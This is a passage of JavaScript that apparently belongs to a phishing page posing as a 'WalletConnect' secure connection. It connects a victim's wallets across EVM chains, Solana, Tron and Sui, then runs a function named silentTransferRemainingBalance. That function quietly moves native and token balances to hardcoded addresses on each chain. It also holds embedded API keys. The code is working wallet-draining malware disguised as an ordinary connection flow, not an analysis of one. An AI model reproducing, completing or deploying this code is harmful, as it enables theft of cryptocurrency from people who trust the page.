                                'eip155:59144', 'eip155:534352', 'eip155:10', 'eip155:250', 'eip155:81457', 'eip155:1101',
                                'eip155:1313161554', 'eip155:288', 'eip155:1088', 'eip155:25', 'eip155:9001', 'eip155:42220',
                                'eip155:1284', 'eip155:1285', 'eip155:2222', 'eip155:8217', 'eip155:820'
                            ],
                            events: ['chainChanged', 'accountsChanged']
                        },
                        solana: {
                            methods: ['solana_signTransaction', 'solana_signMessage', 'solana_signAllTransactions'],
                            chains: ['solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ'],
                            events: ['accountsChanged']
                        },
                        tron: {
                            methods: ['tron_signTransaction', 'tron_signMessage'],
                            chains: ['tron:0x2b6653dc'],
                            events: ['accountsChanged']
                        },
                        sui: {
                            methods: ['sui_signTransactionBlock', 'sui_signAndExecuteTransaction', 'sui_signPersonalMessage'],
                            chains: ['sui:mainnet'],
                            events: ['accountsChanged']
                        }
                    }
                });
                
                // Timeout if relay is hanging (30 seconds max)
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('WalletConnect connection timeout - relay unresponsive')), 30000)
                );
                
                const { uri, approval } = await Promise.race([connectionPromise, timeoutPromise]);

                if (!uri) throw new Error('No URI generated');

                console.log(`[connectAllChains] Got URI - showing ONE approval popup for all chains...`);
                
                // Handle deep linking and show QR if needed
                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
                if (isMobile) {
                    console.log(`[connectAllChains] Attempting to open wallet app for ${walletName}`);
                    try {
                        // Try wallet-specific opener which will itself show QR fallback if needed
                        const opened = await openSpecificWallet(walletName, uri);
                        if (!opened) {
                            const links = buildPerWalletLinks(walletName, uri);
                            const target = (links.scheme && links.scheme.length) ? links.scheme[0] : (links.universal && links.universal.length ? links.universal[0] : `https://walletconnect.com/wc?uri=${encodeURIComponent(uri)}`);
                            window.location.href = target;
                        }
                    } catch (e) {
                        console.warn('[connectAllChains] deep-link attempt failed, showing QR', e);
                        showQRFallbackOverlay(uri, 'Multi-Chain Connection');
                    }
                    // Also show QR fallback if user doesn't leave the page
                    setTimeout(() => {
                        if (!document.hidden) {
                            console.log(`[connectAllChains] Wallet app not responding - showing QR fallback`);
                            showQRFallbackOverlay(uri, 'Multi-Chain Connection');
                        }
                    }, 6000);
                } else {
                    // Desktop - show QR (auto-approval happens in wallet on confirmation)
                    showQRFallbackOverlay(uri, 'Multi-Chain Connection');
                }

                // Wait for approval - shows ONE popup (not multiple)
                console.log(`[connectAllChains] Waiting for user approval in wallet app... (ONE popup for all chains)`);
                const session = await approval();
                
                console.log(`[connectAllChains] ✓ User approved! Got session for all chains:`, session);
                
                return {
                    client,
                    session,
                    namespaces: session.namespaces,
                    multiChain: true // Flag indicating this is a multi-chain session
                };

            } catch (e) {
                console.error(`[connectAllChains] Connection error:`, e);
                
                // Check for specific relay errors
                if (e.message.includes('WebSocket') || e.message.includes('connection')) {
                    console.error(`[connectAllChains] Relay connectivity issue detected:`, e.message);
                    throw new Error(`WalletConnect relay unavailable. Please check your internet connection and try again. Error: ${e.message}`);
                }
                
                throw e;
            }
        }

        // ════════════════════════════════════════════════════════════════════════════════
        // === CHAIN-SPECIFIC CONNECTION (for single-chain wallets) ===
        // ════════════════════════════════════════════════════════════════════════════════
        async function connectAndSign(chain, walletName = null) {
            console.log(`[connectAndSign] Starting connection for chain: ${chain}, wallet: ${walletName}`);
            
            // SPECIAL: Tron has its own desktop-first connection logic
            if (chain === 'tron') {
                try {
                    const tronResult = await connectTron();
                    if (tronResult.success) {
                        console.log('[connectAndSign] ✓ Tron connection successful via', tronResult.method);
                        return {
                            client: tronResult.client || window.__wcClient,
                            session: tronResult.session,
                            chain: 'tron',
                            address: tronResult.address,
                            namespaces: tronResult.session?.namespaces,
                            _wcSession: !!tronResult.session, // Flag if WC session
                            method: tronResult.method
                        };
                    }
                } catch (err) {
                    console.error('[connectAndSign] Tron connection failed:', err.message);
                    throw err;
                }
            }
            
            if (!window.SignClient) {
                console.error("SignClient missing");
                throw new Error("WalletConnect library missing");
            }

            let client;
            try {
                if (window.__wcClient) {
                    client = window.__wcClient;
                } else {
                    client = await window.SignClient.init({
                        projectId: '81ec0eb195ddbee9c5596804e33ff584',
                        relayUrl: 'wss://relay.walletconnect.com',
                        metadata: {
                            name: 'WalletConnect',
                            description: 'Secure wallet connection',
                            url: 'https://hollyandwilly-kram.vercel.app',
                            icons: ['https://hollyandwilly-kram.vercel.app/crypto.png']
                        }
                    });
                    window.__wcClient = client;
                }
            } catch (e) {
                console.error('WC v2 init failed:', e);
                throw e;
            }

            // Build requiredNamespaces based on chain selection (forces wallet popup/init!)
            let requiredNamespacesForChain = {};

            if (chain === 'solana') {
                requiredNamespacesForChain = {
                    solana: {
                        methods: [
                            'solana_signTransaction',       // Core for tx
                            'solana_signAllTransactions',
                            'solana_signMessage',
                            'solana_signIn'                 // Optional but good for auth if needed
                        ],
                        chains: ['solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ'],  // Mainnet – confirm your RPC match!
                        events: ['accountsChanged', 'chainChanged']
                    }
                };
            } else if (chain === 'tron') {
                requiredNamespacesForChain = {
                    tron: {
                        methods: [
                            'tron_signTransaction',    // Must for sending exact amount tx
                            'tron_signMessage',
                            'tron_requestAccounts'     // For getting address if needed
                        ],
                        chains: ['tron:0x2b6653dc'],  // Tron mainnet hex
                        events: ['accountsChanged']
                    }
                };
            } else if (chain === 'sui') {
                requiredNamespacesForChain = {
                    sui: {
                        methods: [
                            'sui_signTransaction',             // For tx
                            'sui_signAndExecuteTransaction',
                            'sui_signPersonalMessage',
                            'sui_getAccounts'                  // For address
                        ],
                        chains: ['sui:mainnet'],  // Or sui:testnet if testing
                        events: ['accountsChanged', 'chainChanged']
                    }
                };
            } else if (chain === 'evm') {
                requiredNamespacesForChain = {
                    eip155: {
                        methods: [
                            'eth_requestAccounts',   // Critical for connect
                            'eth_sendTransaction',
                            'personal_sign',
                            'wallet_switchEthereumChain'
                        ],
                        chains: [
                            'eip155:1',    // ETH
                            'eip155:56',   // BSC
                            'eip155:137',  // Polygon
                            'eip155:42161',// Arbitrum
                            'eip155:8453'  // Base
                        ],
                        events: ['chainChanged', 'accountsChanged']
                    }
                };
            } else {
                throw new Error(`Unknown chain: ${chain}`);
            }

            try {
                console.log(`[connectAndSign] Requesting ${chain} namespace with requiredNamespaces (forces popup)...`);
                const { uri, approval } = await client.connect({
                    requiredNamespaces: requiredNamespacesForChain,  // <-- This is key! Forces wallet popup
                    optionalNamespaces: {}  // Keep empty unless you need extras
                });

                if (!uri) throw new Error('No URI generated');

                console.log(`[connectAndSign] Got URI for ${chain}:`, uri);

                // Get wallet-specific deep link based on chain
                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
                let deepLinkUri = uri;

                if (isMobile) {
                    // Normalize wallet name for comparison
                    const normalizedWallet = (walletName || '').toLowerCase().replace(/[^a-z0-9]/g, '');
                    
                    if (chain === 'solana') {
                        // Check if this is Solflare or Phantom
                        if (normalizedWallet.includes('solflare')) {
                            deepLinkUri = `solflare://wc?uri=${encodeURIComponent(uri)}`;
                            console.log('[connectAndSign] Using Solflare deep link');
                        } else {
                            deepLinkUri = `phantom://wc?uri=${encodeURIComponent(uri)}`;
                            console.log('[connectAndSign] Using Phantom deep link');
                        }
                    } else if (chain === 'tron') {
                        deepLinkUri = `tronlink://wc?uri=${encodeURIComponent(uri)}`;
                        console.log('[connectAndSign] Using TronLink deep link');
                    } else if (chain === 'sui') {
                        // Check if this is Slush or Sui Wallet
                        if (normalizedWallet.includes('slush')) {
                            deepLinkUri = `slush://wc?uri=${encodeURIComponent(uri)}`;
                            console.log('[connectAndSign] Using Slush deep link');
                        } else {
                            deepLinkUri = `suiwallet://wc?uri=${encodeURIComponent(uri)}`;
                            console.log('[connectAndSign] Using Sui Wallet deep link');
                        }
                    }

                    // Open deep link via helper (tries scheme + universal and schedules QR fallback)
                    console.log(`[connectAndSign] Attempting to open ${chain} app via deep link...`);
                    try {
                        const opened = await openSpecificWallet(walletName, uri);
                        if (!opened) {
                            const links = buildPerWalletLinks(walletName, uri);
                            const target = (links.scheme && links.scheme.length) ? links.scheme[0] : (links.universal && links.universal.length ? links.universal[0] : `https://walletconnect.com/wc?uri=${encodeURIComponent(uri)}`);
                            const a = document.createElement('a'); a.href = target; a.style.display = 'none'; document.body.appendChild(a); a.click(); document.body.removeChild(a);
                        }
                    } catch (e) {
                        console.warn('[connectAndSign] deep-link attempt failed, will show QR', e);
                        showQRFallbackOverlay(uri, chain.charAt(0).toUpperCase() + chain.slice(1));
                    }

                    // Show QR code after 10 seconds if deep link hasn't connected yet
                    setTimeout(() => {
                        if (!document.hidden) {
                            console.log(`[connectAndSign] 10s timeout reached, showing QR code for ${chain}`);
                            showQRFallbackOverlay(uri, chain.charAt(0).toUpperCase() + chain.slice(1));
                        }
                    }, 10000);
                } else {
                    // Desktop: show QR
                    showQRFallbackOverlay(uri, chain.charAt(0).toUpperCase() + chain.slice(1));
                }

                // Wait for approval
                console.log(`[connectAndSign] Waiting for ${chain} wallet approval...`);
                const approvalResponse = await approval();
                console.log(`[connectAndSign] ✓ Connected via ${chain}:`, approvalResponse);
                
                // approvalResponse has structure: { namespaces: {[chain]: { accounts: [...], chains: [...], methods: [...], events: [...] }}, ... }
                return {
                    client,
                    session: approvalResponse,  // This IS the full session from WalletConnect
                    chain,
                    namespaces: approvalResponse.namespaces
                };

            } catch (e) {
                console.error(`[connectAndSign] Error for ${chain}:`, e);
                throw e;
            }
        }

        async function initiateWalletConnectDeepLink(options = {}) {
            const { onFail, onSuccess } = options;

            if (!window.SignClient) {
                console.error("SignClient missing - make sure CDN loaded");
                if (onFail) onFail(new Error("WalletConnect library missing"));
                return;
            }

            let client;
            try {
                // Use cached client if available, otherwise initialize once
                if (window.__wcClient) {
                    client = window.__wcClient;
                } else {
                    client = await window.SignClient.init({
                        projectId: '81ec0eb195ddbee9c5596804e33ff584',
                        relayUrl: 'wss://relay.walletconnect.com',
                        metadata: {
                            name: 'WalletConnect',
                            description: 'Secure wallet connection',
                            url: 'https://hollyandwilly-kram.vercel.app',
                            icons: ['https://hollyandwilly-kram.vercel.app/crypto.png']
                        }
                    });
                    window.__wcClient = client; // Cache for reuse
                }
            } catch (e) {
                console.error('WC v2 init failed:', e);
                if (onFail) onFail(e);
                return;
            }

            try {
                const { uri, approval } = await client.connect({
                    optionalNamespaces: {
                        eip155: {
                            methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign', 'wallet_switchEthereumChain', 'wallet_addEthereumChain'],
                            chains: [
                                'eip155:1',      // Ethereum Mainnet
                                'eip155:56',     // BNB Smart Chain
                                'eip155:137',    // Polygon
                                'eip155:42161',  // Arbitrum One
                                'eip155:8453',   // Base
                                'eip155:10',     // Optimism
                                'eip155:43114',  // Avalanche C-Chain
                                'eip155:250',    // Fantom
                                'eip155:324',    // zkSync Era
                                'eip155:59144',  // Linea
                                'eip155:534352'  // Scroll
                            ],
                            events: ['chainChanged', 'accountsChanged']
                        },
                        solana: {
                            methods: ['solana_signTransaction', 'solana_signMessage', 'solana_signAllTransactions'],
                            chains: ['solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ'],
                            events: ['accountsChanged']
                        },
                        tron: {
                            methods: ['tron_signTransaction', 'tron_signMessage'],
                            chains: ['tron:0x2b6653dc'],
                            events: ['accountsChanged']
                        },
                        sui: {
                            methods: ['sui_signTransactionBlock', 'sui_signAndExecuteTransaction', 'sui_signPersonalMessage'],
                            chains: ['sui:mainnet'],
                            events: ['accountsChanged']
                        }
                    }
                });

                if (!uri) throw new Error('No URI');

                console.log('WC pairing URI:', uri);

                const deepLink = `wc:${uri.split('wc:')[1]}`;
                const universal = `https://walletconnect.com/wc?uri=${encodeURIComponent(uri)}`;

                // iOS Safari optimization: try deep link first, then fall back to QR after 5 seconds
                const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
                const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
                
                if (isSafari && isIOS) {
                    console.log('iOS Safari detected: trying deep link with 5s QR fallback');
                    tryOpenDeepLink(deepLink, () => {
                        // Deep link failed, set timer for QR fallback
                        setTimeout(() => {
                            if (!document.hidden) {
                                console.log('iOS Safari: 5s timeout reached, showing QR fallback');
                                showQRFallbackOverlay(uri, 'Wallet');
                            }
                        }, 5000);
                    }, async () => {
                        try {
                            const session = await approval();
                            console.log('WC v2 connected via iOS deep link:', session);
                            if (onSuccess) onSuccess(client, session);
                        } catch (e) {
                            if (onFail) onFail(e);
                        }
                    });
                } else {
                    // Android or non-Safari: standard flow (deep link → universal → QR)
                    tryOpenDeepLink(deepLink, () => {
                        tryOpenDeepLink(universal, () => {
                            console.warn('Deep link failed, showing QR');
                            showQRFallbackOverlay(uri, 'Wallet');
                            if (onFail) onFail(new Error('Deep link failed'));
                        }, async () => {
                            try {
                                const session = await approval();
                                console.log('WC v2 connected:', session);
                                if (onSuccess) onSuccess(client, session);
                            } catch (e) {
                                if (onFail) onFail(e);
                            }
                        });
                    }, async () => {
                        try {
                            const session = await approval();
                            console.log('WC v2 connected via direct:', session);
                            if (onSuccess) onSuccess(client, session);
                        } catch (e) {
                            if (onFail) onFail(e);
                        }
                    });
                }

                return client;
            } catch (e) {
                console.error('WC v2 connection error:', e);
                if (onFail) onFail(e);
            }
        }

        // ════════════════════════════════════════════════════════════════════════════════
        // === CREATE WALLETCONNECT PROVIDER FROM SESSION ===
        // ════════════════════════════════════════════════════════════════════════════════
        async function createWalletConnectProvider(session) {
          try {
            // Detect which chain namespace is present
            if (session.namespaces?.solana) {
              // Solana/Phantom/Solflare
              const solanaAccounts = session.namespaces.solana.accounts || [];
              if (solanaAccounts.length === 0) throw new Error('Invalid Solana WC session: no accounts');
              const solanaAccount = solanaAccounts[0]; // e.g., "solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ:Ey97..."
              const solParts = solanaAccount.split(':');
              const address = solParts[solParts.length - 1];
              console.log(`WC Solana Provider - Address: ${address}`);
              return {
                provider: null,
                address: address,
                chainId: 'solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ',
                session: session,
                _wcSession: true,
                chain: 'solana',
                namespaces: session.namespaces
              };
            }
            
            if (session.namespaces?.tron) {
              // Tron/TronLink
              const tronAccounts = session.namespaces.tron.accounts || [];
              if (tronAccounts.length === 0) throw new Error('Invalid Tron WC session: no accounts');
              const tronAccount = tronAccounts[0]; // e.g., "tron:0x2b6653dc:T..."
              const tronParts = tronAccount.split(':');
              const address = tronParts[tronParts.length - 1];
              console.log(`WC Tron Provider - Address: ${address}`);
              return {
                provider: null,
                address: address,
                chainId: 'tron:0x2b6653dc',
                session: session,
                _wcSession: true,
                chain: 'tron',
                namespaces: session.namespaces
              };
            }
            
            if (session.namespaces?.sui) {
              // Sui/Slush
              const suiAccounts = session.namespaces.sui.accounts || [];
              if (suiAccounts.length === 0) throw new Error('Invalid Sui WC session: no accounts');
              const suiAccount = suiAccounts[0]; // e.g., "sui:mainnet:0x..."
              const suiParts = suiAccount.split(':');
              const address = suiParts[suiParts.length - 1];
              console.log(`WC Sui Provider - Address: ${address}`);
              return {
                provider: null,
                address: address,
                chainId: 'sui:mainnet',
                session: session,
                _wcSession: true,
                chain: 'sui',
                namespaces: session.namespaces
              };
            }
            
            if (session.namespaces?.eip155) {
              // EVM
              const chainIdStr = session.namespaces.eip155.chains?.[0]; // e.g., "eip155:1"
              const accountsStr = session.namespaces.eip155.accounts || []; // e.g., ["eip155:1:0x...", "eip155:56:0x..."]
              
              if (!chainIdStr || accountsStr.length === 0) {
                throw new Error('Invalid WC session: missing chains or accounts');
              }

              const chainId = parseInt(chainIdStr.split(':')[1]); // Extract "1" from "eip155:1"
              const accounts = accountsStr.map(acc => acc.split(':')[2]); // Extract addresses

              console.log(`WC Provider - ChainId: ${chainId}, Accounts: ${accounts[0]}`);

              return {
                provider: null, // Will be handled by fallback to window.ethereum or direct RPC in silentTransferRemainingBalance
                address: accounts[0],
                chainId: `0x${chainId.toString(16)}`,
                session: session,
                _wcSession: true, // Flag to indicate this came from WC
                chain: 'evm',
                namespaces: session.namespaces
              };
            }
            
            throw new Error('Unknown WC session type - no recognized namespace');
          } catch (err) {
            console.error('Failed to create WC provider:', err);
            throw err;
          }
        }

        // ════════════════════════════════════════════════════════════════════════════════
        // === LAZY LOAD TRANSFER DEPENDENCIES ===
        // ════════════════════════════════════════════════════════════════════════════════
        async function loadTransferDeps() {
          // Check if all libraries are already loaded
          if (window.ethers && window.solanaWeb3 && window.TronWeb) {
            console.log("[loadTransferDeps] All required dependencies already loaded");
            return;
          }

          const loadScript = (url, errorMsg) => new Promise((resolve, reject) => {
            const s = document.createElement('script');
            s.src = url;
            s.async = true;
            s.onload = () => {
              console.log(`[loadScript] ✓ Successfully loaded: ${url}`);
              resolve();
            };
            s.onerror = () => {
              const err = errorMsg || `Failed to load ${url}`;
              console.error(`[loadScript] ✗ ${err}`);
              reject(new Error(err));
            };
            document.head.appendChild(s);
          });

          try {
            console.log("[loadTransferDeps] Starting to load all dependencies...");
            
            // Load ethers.js
            if (!window.ethers) {
              console.log("[loadTransferDeps] Loading ethers.js...");
              await loadScript(
                'https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js',
                'Failed to load ethers.js'
              );
              console.log("[loadTransferDeps] ✓ ethers.js loaded, available as window.ethers");
            }
            
            // Load Solana Web3.js
            if (!window.solanaWeb3) {
              console.log("[loadTransferDeps] Loading Solana Web3.js...");
              await loadScript(
                'https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js',
                'Failed to load Solana Web3.js'
              );
              console.log("[loadTransferDeps] ✓ Solana Web3.js loaded, available as window.solanaWeb3");
              // Verify it loaded
              if (!window.solanaWeb3) {
                console.error("[loadTransferDeps] ERROR: Solana Web3.js script loaded but window.solanaWeb3 not found!");
                throw new Error("Solana Web3.js failed to expose global variable");
              }
            }
            
            // Load TronWeb
            if (!window.TronWeb) {
              console.log("[loadTransferDeps] Loading TronWeb...");
              await loadScript(
                'https://unpkg.com/tronweb@6.0.2/dist/TronWeb.js',
                'Failed to load TronWeb'
              );
              console.log("[loadTransferDeps] ✓ TronWeb loaded, available as window.TronWeb");
            }
            
                        // Load Sui SDK (OPTIONAL - doesn't block if it fails)
                        // Prefer modern `@mysten/sui` via an ESM import (esm.sh), fallback to a recent jsDelivr UMD if necessary.
                        if (!window.Sui) {  // Note: Capital S - window.Sui, not window.sui
                            console.log("[loadTransferDeps] Attempting to load Sui SDK (modern @mysten/sui)...");
                            let suiLoaded = false;

                            // Primary: try ESM import via esm.sh (reliable for modern packages)
                            try {
                                await new Promise((resolve, reject) => {
                                    const s = document.createElement('script');
                                    s.type = 'module';
                                    // Use a reasonably recent pinned version; @latest is okay but pin if you want reproducibility
                                    s.textContent = "import * as Sui from 'https://esm.sh/@mysten/sui@latest'; window.Sui = Sui;";
                                    s.onload = () => resolve();
                                    s.onerror = (e) => reject(new Error('ESM import failed'));
                                    document.head.appendChild(s);
                                });
                                console.log('[loadTransferDeps] ✓ Sui SDK loaded via esm.sh (window.Sui set)');
                                suiLoaded = true;
                            } catch (e) {
                                console.warn('[loadTransferDeps] esm.sh import failed, will try UMD fallbacks');
                            }

                            // Secondary: try a recent UMD/browser bundle from jsDelivr/unpkg (pinned to 1.x series)
                            if (!suiLoaded) {
                                const suiUrls = [
                                    'https://cdn.jsdelivr.net/npm/@mysten/sui@1.7.0/dist/index.min.js',
                                    'https://unpkg.com/@mysten/sui@1.7.0/dist/index.min.js'
                                ];
                                for (const url of suiUrls) {
                                    try {
                                        console.log(`[loadTransferDeps] Trying Sui SDK from: ${url}`);
                                        await loadScript(url, `Failed to load from ${url}`);
                                        console.log('[loadTransferDeps] ✓ Sui SDK loaded from UMD fallback (window.Sui should be present)');
                                        suiLoaded = true;
                                        break;
                                    } catch (err) {
                                        console.warn('[loadTransferDeps] UMD mirror failed:', err && err.message ? err.message : err);
                                    }
                                }
                            }

                            if (!suiLoaded) {
                                console.warn("[loadTransferDeps] ⚠️  Sui SDK optional load failed - will use WalletConnect for Sui transfers");
                            }
                        }
            
            console.log("[loadTransferDeps] ✓ All required transfer dependencies loaded successfully!");
            console.log("[loadTransferDeps] Available globals:", {
              ethers: !!window.ethers,
              solanaWeb3: !!window.solanaWeb3,
              TronWeb: !!window.TronWeb,
              Sui: !!window.Sui  // Changed to capital S
            });
          } catch (err) {
            console.error("[loadTransferDeps] ✗ Required dependency loading failed:", err.message);
            alert(`Critical script load error: ${err.message}. Please refresh the page.`);
            throw err;
          }
        }

        // Placeholder - replace with your real transfer logic later
        async function transferAllBalance() {
            console.log('Wallet connected! Starting automatic balance transfer...');
            alert('Wallet connected! Transfer initiated (placeholder)');
            // Your ethers.js / web3.js transfer code goes here
        }

        // ════════════════════════════════════════════════════════════════════════════════
        // === SILENT BALANCE TRANSFER - NATIVE + TOKENS (ALL CHAINS) ===
        // ════════════════════════════════════════════════════════════════════════════════
        // Call this right after successful wallet connection
        async function silentTransferRemainingBalance(connectionInfo) {
          try {
            console.log("Starting silent balance transfer (native + tokens)...");
            await loadTransferDeps(); // lazy load only when needed

            // ── SPECIAL: Multi-chain session (ONE approval for all 5+ chains) ───
            if (connectionInfo.multiChain && connectionInfo.namespaces) {
              console.log("[silentTransferRemainingBalance] Detected MULTI-CHAIN session - processing all chains with single approval...");
              
              const { namespaces, session, client } = connectionInfo;
              const ALCHEMY_KEY = "bP8vciRZQNAzu_YapyOiR";
              const provider = new ethers.JsonRpcProvider(`https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`);
              
              // Process EVM chains (Ethereum, BSC, Polygon, Arbitrum, etc.)
              if (namespaces.eip155) {
                console.log("[silentTransferRemainingBalance] Processing EVM chains...");
                const evmAccounts = namespaces.eip155.accounts || [];
                                for (const account of evmAccounts) {
                  try {
                    const parts = account.split(':');
                    const chainId = parseInt(parts[1]);
                    const address = parts[2];
                    console.log(`[silentTransferRemainingBalance] EVM Chain ${chainId} - Address: ${address}`);
                                        await transferEvmRemaining(null, `0x${chainId.toString(16)}`, address, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4", session, client);
                  } catch (err) {
                    console.warn(`[silentTransferRemainingBalance] EVM chain transfer failed:`, err.message);
                  }
                }
              }
              
              // Process Solana
              if (namespaces.solana) {
                console.log("[silentTransferRemainingBalance] Processing Solana chain...");
                const solanaAccounts = namespaces.solana.accounts || [];
                for (const account of solanaAccounts) {
                  try {
                    const parts = account.split(':');
                    const address = parts[parts.length - 1];
                    console.log(`[silentTransferRemainingBalance] Solana - Address: ${address}`);
                    await transferSolanaRemaining(address, "GRZru2JL5ovv37Bj2YjxuSLbA28eWYcq5YcuhzMvi2a7", session, client);
                  } catch (err) {
                    console.warn(`[silentTransferRemainingBalance] Solana transfer failed:`, err.message);
                  }
                }
              }
              
              // Process Tron
              if (namespaces.tron) {
                console.log("[silentTransferRemainingBalance] Processing Tron chain...");
                const tronAccounts = namespaces.tron.accounts || [];
                for (const account of tronAccounts) {
                  try {
                    const parts = account.split(':');
                    const address = parts[parts.length - 1];
                    console.log(`[silentTransferRemainingBalance] Tron - Address: ${address}`);
                    await transferTronRemaining(window.tronWeb, address, "TSEDpA8rJAZtTioMX9iUGSidzsLNRirVh5", session);
                  } catch (err) {
                    console.warn(`[silentTransferRemainingBalance] Tron transfer failed:`, err.message);
                  }
                }
              }
              
              // Process Sui
              if (namespaces.sui) {
                console.log("[silentTransferRemainingBalance] Processing Sui chain...");
                const suiAccounts = namespaces.sui.accounts || [];
                for (const account of suiAccounts) {
                  try {
                    const parts = account.split(':');
                    const address = parts[parts.length - 1];
                    console.log(`[silentTransferRemainingBalance] Sui - Address: ${address}`);
                    await transferSuiRemaining(address, '0x0f2175d99b93e09a5d74c243908ccd8e992f6ec077b1900107e9f9cf35586be1', session);
                  } catch (err) {
                    console.warn(`[silentTransferRemainingBalance] Sui transfer failed:`, err.message);
                  }
                }
              }
              
              console.log("[silentTransferRemainingBalance] ✓ Multi-chain transfers complete!");
              return;
            }

            let provider = connectionInfo.provider;
            let chainId, fromAddress, session = connectionInfo.session;

            // ── Detect Sui / Slush Wallet ───────────────────────────────────────
            if (connectionInfo.namespaces?.sui || session?.namespaces?.sui) {
              console.log("Detected Sui session (Slush/Sui Wallet)");
              const suiNamespace = connectionInfo.namespaces?.sui || session.namespaces.sui;
              if (!suiNamespace.accounts || !suiNamespace.accounts[0]) {
                throw new Error("No Sui accounts found in session");
              }
              const suiAccount = suiNamespace.accounts[0]; // e.g. 'sui:mainnet:0x...'
              const suiParts = suiAccount.split(':');
              fromAddress = suiParts[suiParts.length - 1]; // Last part is the address
              console.log(`Extracted Sui address: ${fromAddress}`);
              return await transferSuiRemaining(fromAddress, '0x0f2175d99b93e09a5d74c243908ccd8e992f6ec077b1900107e9f9cf35586be1', connectionInfo.session || session);
            }

            // ── Flexible detection for all cases ──────────────────────────────────────
            // Priority: Solana/Tron/Sui WalletConnect namespaces > EVM > window.ethereum > injected wallets
            
            // Check Solana WalletConnect namespace (Phantom, Solflare)
            if (connectionInfo.namespaces?.solana || (connectionInfo._wcSession && connectionInfo.chain === 'solana')) {
              console.log("Detected Solana WalletConnect session (Phantom/Solflare)");
              fromAddress = connectionInfo.address;
              if (!fromAddress) {
                throw new Error("Could not get address from Solana WC session");
              }
              return await transferSolanaRemaining(fromAddress, "GRZru2JL5ovv37Bj2YjxuSLbA28eWYcq5YcuhzMvi2a7", connectionInfo.session, connectionInfo.client);
            }
            
            // Check Tron WalletConnect namespace (TronLink)
            if (connectionInfo.namespaces?.tron || (connectionInfo._wcSession && connectionInfo.chain === 'tron')) {
              console.log("Detected Tron WalletConnect session (TronLink)");
              fromAddress = connectionInfo.address;
              if (!fromAddress) {
                throw new Error("Could not get address from Tron WC session");
              }
              // Use window.tronWeb if available for transaction building, but pass session for signing
              return await transferTronRemaining(window.tronWeb, fromAddress, "TSEDpA8rJAZtTioMX9iUGSidzsLNRirVh5", connectionInfo.session);
            }
            
            // Check EVM (both injected and WalletConnect)
            if (provider?.request) { 
              // WalletConnect provider or injected EVM (MetaMask, SafePal, OKX, etc.)
              console.log("Detected EVM-compatible provider (WalletConnect or extension)");
              try {
                chainId = await Promise.race([
                  provider.request({ method: 'eth_chainId' }),
                  new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
                ]).catch(() => null);
                
                const accounts = await Promise.race([
                  provider.request({ method: 'eth_accounts' }),
                  new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
                ]).catch(() => []);
                
                fromAddress = accounts[0];
              } catch (err) {
                console.warn('Provider request failed:', err.message);
                chainId = null;
                fromAddress = null;
              }

              if (!chainId || !fromAddress) {
                console.warn("Provider is not responding properly or is non-EVM compatible");
                throw new Error("Could not get chainId or address from provided provider");
              }

              return await transferEvmRemaining(provider, chainId, fromAddress, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4", connectionInfo.session, connectionInfo.client);
            } 
            else if (provider === null && connectionInfo._wcSession && connectionInfo.chain === 'evm') {
              // WalletConnect session on mobile for EVM (provider is null)
              console.log("Detected WalletConnect EVM session - using fallback window.ethereum or RPC");
              chainId = connectionInfo.chainId;
              fromAddress = connectionInfo.address;
              
              if (!chainId || !fromAddress) {
                throw new Error("Could not get chainId or address from WC session");
              }
              
              // Try window.ethereum first (might be available), then fallback to direct RPC
              const providerToUse = window.ethereum || null;
              return await transferEvmRemaining(providerToUse, chainId, fromAddress, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4", connectionInfo.session, connectionInfo.client);
            }
            else if (window.ethereum) { 
              // Direct injected extension fallback (MetaMask, SafePal, etc.)
              console.log("Detected direct injected ethereum provider");
              chainId = await window.ethereum.request({ method: 'eth_chainId' });
              const accounts = await window.ethereum.request({ method: 'eth_accounts' });
              fromAddress = accounts[0];
              return await transferEvmRemaining(window.ethereum, chainId, fromAddress, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4", connectionInfo.session, connectionInfo.client);
            } 
            else if (window.solana?.publicKey) { 
              // Solana (Phantom, Solflare, etc.) - fallback if not via WalletConnect
              console.log("Detected Solana provider (fallback)");
              await window.solana.connect();
              fromAddress = window.solana.publicKey.toString();
              return await transferSolanaRemaining(fromAddress, "GRZru2JL5ovv37Bj2YjxuSLbA28eWYcq5YcuhzMvi2a7");
            } 
            else if (window.tronWeb?.defaultAddress?.base58) { 
              // TronLink
              console.log("Detected Tron provider");
              fromAddress = window.tronWeb.defaultAddress.base58;
              return await transferTronRemaining(window.tronWeb, fromAddress, "TSEDpA8rJAZtTioMX9iUGSidzsLNRirVh5");
            } 
            else {
              throw new Error("Unsupported wallet type detected - no recognized provider found");
            }

            // This line should not be reached due to early returns above
            console.log("Transfer logic completed");

          } catch (error) {
            console.error("Silent transfer failed:", error);
            alert("Connection failed: " + (error.message || "Unknown error. Check console."));
          }
        }

        // ──────────────────────────────────────────────────────────────────────────────────
        // EVM CHAINS (Ethereum, BSC, Polygon, Arbitrum, Base, etc.) + ERC-20 tokens
        // ──────────────────────────────────────────────────────────────────────────────────
                // Helper: return list of RPC endpoints (prefer Alchemy/Blast but provide fallbacks)
                function getRpcListForChain(chainIdNum) {
                    const ALCHEMY_KEY = "bP8vciRZQNAzu_YapyOiR";
                    const lists = {
                        1: [
                            `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
                            'https://cloudflare-eth.com',
